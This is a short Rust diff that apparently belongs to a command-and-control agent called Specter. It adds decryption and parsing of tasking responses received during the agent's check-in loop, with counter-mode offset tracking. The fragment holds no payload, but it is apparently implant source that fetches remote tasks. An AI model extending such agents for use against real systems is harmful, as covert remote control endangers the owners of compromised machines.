@@ -10,6 +10,7 @@ use crate::config::SpecterConfig;
 use crate::error::SpecterError;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, ctr_blocks_for_len, parse_init_ack,
+    parse_tasking_response,
 };
 use crate::transport::HttpTransport;
 
@@ -141,8 +142,15 @@ impl SpecterAgent {
         // The encrypted payload is the entire envelope payload (command_id + request_id + len + data)
         let encrypted_len = 4 + 4 + 4; // command_id + request_id + payload_len (0 bytes payload)
         self.send_ctr_offset += ctr_blocks_for_len(encrypted_len);
+        let tasking = parse_tasking_response(
+            self.agent_id,
+            &self.session_crypto,
+            self.recv_ctr_offset,
+            &response,
+        )?;
+        self.recv_ctr_offset = tasking.next_recv_ctr_offset;
 
-        Ok(response)
+        Ok(tasking.decrypted)
     }
 
     /// Run the main agent loop: init, then checkin repeatedly.
